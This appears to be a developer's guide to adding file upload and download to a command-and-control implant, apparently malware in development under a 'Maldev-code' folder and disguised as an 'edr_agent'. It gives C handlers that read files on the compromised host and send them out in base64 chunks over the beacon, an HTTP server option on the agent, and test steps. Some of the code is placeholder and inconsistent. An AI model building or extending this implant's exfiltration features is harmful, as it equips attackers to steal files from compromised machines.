# File Transfer Implementation Guide

## Current State

✅ **Working:**
- TUI sends file-send/file-recv commands
- Dispatcher receives and routes commands
- File transfer modules loaded and ready

❌ **Missing:**
- Implant command handler for `file-send` / `file-recv`
- Actual file I/O in the modules
- Response/feedback mechanism

## What Needs to Be Done

### Step 1: Add Command Handler in Implant

In `src/implant/edr_agent.c`, add a dispatcher handler:

```c
static void handle_file_send(const edr_message_t *msg, void *ctx) {
    /* Parse: "file-send /local/path /remote/path"
     * 1. Read file from /local/path on TUI machine
     * 2. Send via beacon in chunks (base64)
     * 3. Write to /remote/path on agent
     */
    
    // Extract paths from msg->payload
    char local_path[512], remote_path[512];
    parse_file_paths(msg->payload, local_path, remote_path);
    
    // Open and read file
    FILE *f = fopen(local_path, "rb");
    if (!f) {
        send_error_response(ctx, "File not found");
        return;
    }
    
    // Read in chunks, base64 encode, send via beacon
    char chunk[4096];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0) {
        char b64[6144];
        base64_encode(chunk, n, b64);
        
        // Send chunk via beacon
        edr_message_t response = {
            .command_id = "file-chunk",
            .payload = /* JSON with b64 data */
        };
        send_message(&response);
    }
    
    fclose(f);
}

static void handle_file_recv(const edr_message_t *msg, void *ctx) {
    /* Parse: "file-recv /remote/path"
     * 1. Read file from agent's /remote/path
     * 2. Send chunks via beacon (base64)
     * 3. TUI receives and writes locally
     */
     
    char remote_path[512];
    parse_command_arg(msg->payload, remote_path);
    
    FILE *f = fopen(remote_path, "rb");
    if (!f) {
        send_error_response(ctx, "File not found on agent");
        return;
    }
    
    // Read and send chunks
    char chunk[4096];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0) {
        char b64[6144];
        base64_encode(chunk, n, b64);
        
        edr_message_t response = {
            .command_id = "file-chunk-response",
            .payload = /* JSON with b64 data */
        };
        send_message(&response);
    }
    
    fclose(f);
}
```

### Step 2: Register Handlers in Dispatcher

In dispatcher initialization:

```c
dispatcher_register_command(d, "file-send", handle_file_send);
dispatcher_register_command(d, "file-recv", handle_file_recv);
```

### Step 3: TUI File Reception

In `src/main.rs`, add handler for `file-chunk-response`:

```rust
// When TUI receives file-chunk-response from beacon
if msg.command_id == "file-chunk-response" {
    let b64_data = extract_b64(&msg.payload);
    let bytes = base64_decode(b64_data);
    file_op.file_handle.write_all(&bytes)?;
    file_op.progress += (bytes.len() as f32) / (total_size as f32);
}
```

## Architecture Flow

```
TUI (file upload):
  1. User enters: /home/branis/upload_test.txt
  2. Remote path: C:\Users\MALDEV01\Desktop\...
  3. Sends: file-send /home/... C:\...
     ↓
Dispatcher:
  1. Receives command
  2. Routes to implant via beacon
     ↓
Implant (on agent):
  1. Handler receives file-send command
  2. Opens /home/branis/upload_test.txt
  3. Reads in 4KB chunks
  4. Base64 encodes each chunk
  5. Sends via beacon: {"chunk": "BASE64_DATA", "offset": N}
  6. Beacon delivers to TUI
  7. Writes to: C:\Users\MALDEV01\Desktop\...
```

## Alternative: HTTP Module

For the file_http_comm.dll, instead of beacon:

```c
// Agent starts HTTP server on port 8888
// TUI POSTs file directly:
POST http://agent-ip:8888/upload/file.txt
Content-Type: application/octet-stream
[binary file data]

// Or downloads:
GET http://agent-ip:8888/download/remote_file.txt
```

## Implementation Order

1. **Phase 1 (Easy)**: Add file-send handler to implant, implement file read + chunk loop
2. **Phase 2 (Medium)**: Wire beacon response back to TUI, reassemble chunks
3. **Phase 3 (Advanced)**: Add HTTP server in file_http_comm.dll for faster transfers
4. **Phase 4 (Polish)**: Add progress tracking, resume capability, compression

## Testing

```bash
# 1. Create test file
echo "Hello from TUI" > /home/branis/upload_test.txt

# 2. In TUI:
[c] upload
/home/branis/upload_test.txt
C:\Users\MALDEV01\Desktop\Maldev-code\cynosure\upload_test.txt

# 3. Check agent filesystem:
ls C:\Users\MALDEV01\Desktop\Maldev-code\cynosure\upload_test.txt
cat C:\Users\MALDEV01\Desktop\Maldev-code\cynosure\upload_test.txt
# Should print: "Hello from TUI"
```

## References

- Base64 implementation: Already in VPN module
- File I/O: Standard C stdio
- JSON parsing: Already in beacon protocol
- Beacon transmission: Use existing send_message() API

The command structure is 100% ready. Just need the handler implementations!
